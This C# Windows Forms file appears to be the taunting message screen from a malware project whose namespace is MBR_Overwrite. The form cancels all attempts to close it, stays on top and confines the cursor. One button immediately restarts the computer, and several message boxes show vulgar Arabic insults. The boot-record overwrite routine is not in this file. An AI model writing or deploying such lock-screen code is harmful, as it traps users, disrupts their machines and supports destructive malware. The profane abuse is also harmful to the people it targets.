using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MBR_Overwrite
{
    public partial class Message0 : Form
    {
        private int r = 255;
        private int g = 0;
        private int b = 0;

        public Message0()
        {
          

            this.StartPosition = FormStartPosition.CenterScreen;


            this.BackColor = System.Drawing.Color.Magenta;

            Cursor.Clip = Screen.PrimaryScreen.Bounds;
            InitializeComponent();
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
        }

        private void Message_Load(object sender, EventArgs e)
        {
            
            timer1.Start();
           ;
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        public void Message_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;

        }


        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                Label4.ForeColor = Color.FromArgb(r, g, b);
                guna2Button3.ForeColor = Color.FromArgb(r, g, b);
                Label2.ForeColor = Color.FromArgb(r, g, b);
                Label3.ForeColor = Color.FromArgb(r, g, b);
                Guna2Button9.ForeColor = Color.FromArgb(r, g, b);
                Guna2Button8.ForeColor = Color.FromArgb(r, g, b);
                Guna2Button10.ForeColor = Color.FromArgb(r, g, b);
                Guna2Button14.ForeColor = Color.FromArgb(r, g, b);
                Label1.ForeColor = Color.FromArgb(r, g, b);


                if (r > 0 && b == 0)
                {
                    r -= 1;
                    g += 2;
                }

                if (g > 0 && r == 0)
                {
                    g -= 1;
                    b += 4;
                }

                if (b > 0 && g == 0)
                {
                    b -= 1;
                    r += 2;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
     
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Crips : تلغم الناس وتاخذ نيترو خلق الله وتبي تنيك امك وش تبي اسوي لك وش كاتب في البحث ايش تبغاء اسوي لك ف يالله القم ");
        }

        private void Guna2Panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Guna2Button18_Click(object sender, EventArgs e)
        {
            this.Guna2Transition1.Hide(this.Guna2Panel4, false, null);
            this.Guna2Transition1.ShowSync(this.Guna2Panel3, false, null);
        }

        private void Guna2Button17_Click(object sender, EventArgs e)
        {
            this.Guna2Transition1.Hide(this.Guna2Panel3, false, null);
            this.Guna2Transition1.ShowSync(this.Guna2Panel4, false, null);
        }

        private void Guna2Button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Try again", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void Guna2Button1_Click(object sender, EventArgs e)
        {
            Process.Start("shutdown", "/r /t 0"); //restart Pc
        }

        private void Guna2Button2_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("0xParrot : القم ياسبك ");
        }

        private void Guna2Button14_Click(object sender, EventArgs e)
        {
            Process.Start("https://parrot-dev.web.app");
        }

        private void Guna2Button8_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/XpUwE9FX");
        }

        private void Guna2Button9_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/Rigbyyq");
        }
    }

    }

